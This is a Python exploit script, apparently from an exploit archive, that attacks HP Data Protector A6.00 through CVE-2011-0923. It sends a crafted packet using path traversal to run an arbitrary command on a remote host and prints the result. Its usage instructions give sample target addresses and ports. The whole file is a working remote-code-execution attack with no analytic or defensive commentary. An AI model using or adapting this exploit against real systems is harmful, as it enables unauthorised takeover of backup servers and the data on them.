#!/usr/bin/python

# Exploit Title: HP Data Protector A6.00 Remote Code Execution
# Google Dork: -
# Date: 23/06/2017
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: -
# Software Link: -
# Version: HP Data Protector A6.00 (internal build 331, built on Tue 04 Jul 2006)
# Tested on: Linux Kernel 2.6.18
# CVE : CVE-2011-0923
# Usage: python exploit.py <target ip> <port> <command with full path without parameters e.g. "/usr/bin/id">
# Example: exploit.py 192.168.2.3 514 "/usr/bin/id"

import socket
import struct
import sys
import time

def exploit(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        # command = "/usr/bin/id"
        OFFSET_DEC_START = 134
        OFFSET_DEC = (OFFSET_DEC_START + len(command))
        OFFSET_USE = chr(OFFSET_DEC)

        PACKET_DATA = "\x00\x00\x00"+OFFSET_USE+"\x20\x32\x00\x20\x2E\x2E\x2E\x2E\x2E\x2E\x00\x20\x30\x00\x20\x2E\x2E\x2E\x2E\x2E\x2E\x00\x20\x2E\x2E\x2E\x2E\x2E\x2E\x00\x20\x2E\x00\x20\x32\x30\x00\x20\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x00\x20\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x30\x00\x20\x30\x00\x20\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F"+command+"\x00\x00"
        # Send payload to target
        print "[+] Sending PACKET_DATA"
        
        sock.send(PACKET_DATA)
        # Parse the response back
        print "[*] Result:\n"
        while True:
            response = sock.recv(2048)
            if not response: break
            print response

    except Exception as ex:
        print >> sys.stderr, "[-] Socket error: \n\t%s" % ex
        exit(-3)
    sock.close()

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
        command = sys.argv[3]
        command = str(command).replace(" ", "\x09")
        # target = "10.20.40.90"
        # port = 5555
        # command = "/usr/bin/id"
        # command must be in full path
        exploit(target, port, command)
    except IndexError:
         print("Usage: python exploit.py <target ip> <port> <command with full path without parameters e.g. \"/usr/bin/id\">")
    exit(0)